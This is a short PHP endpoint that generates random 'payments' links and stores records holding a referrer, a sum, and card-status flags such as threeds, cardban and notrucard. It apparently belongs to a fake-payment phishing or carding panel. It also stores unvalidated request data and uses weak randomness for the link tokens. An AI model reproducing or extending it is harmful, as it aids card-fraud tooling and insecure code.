<?php

if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'] == 'XMLHttpRequest') {
	define("access", "yes");
	require_once $_SERVER["DOCUMENT_ROOT"].'/admin/connection.php';

	$settings = R::load('settings', 1);

	$rand = mt_rand(0, 80000000);
	$a =  md5($rand);
	$link =  $settings->domain.'/payments/' . substr($a, 0,8) . '-' . substr($a, 8,8) .'-'.substr($a, 16,8) .'-'.substr($a, 24,8);
	// print_r($link);


		$newLink = R::dispense('path');
		$newLink->link = $link;
		$newLink->creator = $_POST['ref'];
		$newLink->method = 0;
		$newLink->sum = $_POST['sum'];
		$newLink->x = 2;
		$newLink->ip = $settings->domain;
		$newLink->cheker = 0;
		$newLink->success = 0;
		$newLink->nomoney = 0;
		$newLink->limited = 0;
		$newLink->error = 0;
		$newLink->threeds = 0;
		$newLink->disablepay = 0;
		$newLink->cardban = 0;
		$newLink->notrucard = 0;
		$newLink->id_person = $_COOKIE['idPerson'];

		$newLink->time = time();
		R::store($newLink);
		echo $link;


	// echo 1;
    exit;
} else {
    // echo 0;
    exit;
}
?>